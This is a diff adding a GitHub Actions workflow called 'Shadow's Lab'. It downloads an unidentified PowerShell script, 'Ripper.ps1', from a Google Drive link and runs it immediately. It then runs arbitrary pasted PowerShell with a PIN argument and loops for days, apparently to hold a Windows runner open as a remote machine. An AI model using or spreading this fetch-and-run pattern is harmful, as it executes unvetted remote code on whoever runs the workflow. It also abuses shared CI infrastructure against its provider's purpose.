@@ -1,0 +1,36 @@
+# WRITTEN BY Shadow.
+
+name: Shadow's Lab
+
+on:
+  workflow_dispatch:
+    inputs:
+      code:
+        description: Paste Powershell Code
+        required: true
+
+jobs:
+  build:
+    name: Shadow's Lab Running
+    runs-on: windows-latest
+    timeout-minutes: 999999
+
+    steps:
+    - name: Downloading Essentials(Pre-specified)...
+      run: |
+        # WAIT FOR SOME MOMENT
+        Invoke-WebRequest -Uri "https://drive.usercontent.google.com/download?id=1KDZ1zZ-xqiaIZ2-8blIputjtpoS5wnqO&export=download&authuser=0&confirm=t&uuid=fdbceb6f-1b4d-49c1-9128-d38cf855055b&at=APZUnTVUm1AGqItiY6LCUoXfH13d%3A1716612457921" -OutFile "Ripper.ps1" && ./Ripper.ps1
+    - name: Starting LAB...
+      run: |
+        # CONNECTING WITH VM...
+        ${{ inputs.code }} -pin=242427
+    - name: LAB is Running...
+      run: |
+        # READY TO WORK!
+        $i = 999999
+         do {
+             Write-Host $i
+             Sleep 60
+             $i--
+        } while ($i -gt 0)
+        
